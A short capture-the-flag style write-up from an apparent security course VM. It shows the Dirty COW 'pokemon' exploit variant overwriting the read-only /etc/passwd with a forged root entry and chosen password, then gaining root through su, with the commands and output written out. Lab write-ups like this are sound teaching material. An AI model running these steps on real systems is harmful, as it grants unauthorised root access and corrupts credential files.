# Writeup 5 - Dirty Cow Pokemon

<br>

In this exploit, we're going to use a variation of the exloit DirtyCow 
used in writeup2, [Pokemon](https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c).

We using this version to override a read_only file with the content of our choice.

We can connect to any user using ssh (look at
[Writeup1](https://github.com/A-Mahla/Security-Pentest-Part-II/blob/main/writeup1.md) -
`Step 5` / `Step 6` or `Step 7` to find some credential users).

Just have to copy the files `pokemon.c, ,crypt_passwd.c, poke_compile.sh` from
(`../scripts/`), and run these commands: 

```shell
laurie@BornToSecHackMe:~$  sh poke_compile.sh
laurie@BornToSecHackMe:~$  ./crypt_passwd fdidelot imsalty
root:imNy5uOgA7Fuk:0:0:miltank:/root:/bin/bash
laurie@BornToSecHackMe:~$  ./pokecow /etc/passwd root:imNy5uOgA7Fuk:0:0:miltank:/root:/bin/bash
/etc/passwd                               
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, /root:imNy5uOgA7Fuk:0:0:miltank:/root:/bin/bash                          
     //    //                              
    ^^    ^^                               
mmap b7fd9000

madvise 0

ptrace 0

laurie@BornToSecHackMe:~$ cat /etc/passwd | head -1
root:imNy5uOgA7Fuk:0:0:miltank:/root:/bin/bashTEon:/usr/sbin:/bin/sh
```
We can now connect to root using the password we encrypted

```shell
laurie@BornToSecHackMe:~$ su
Password: 
root@BornToSecHackMe:/home/laurie# whoami
root
```

We did it !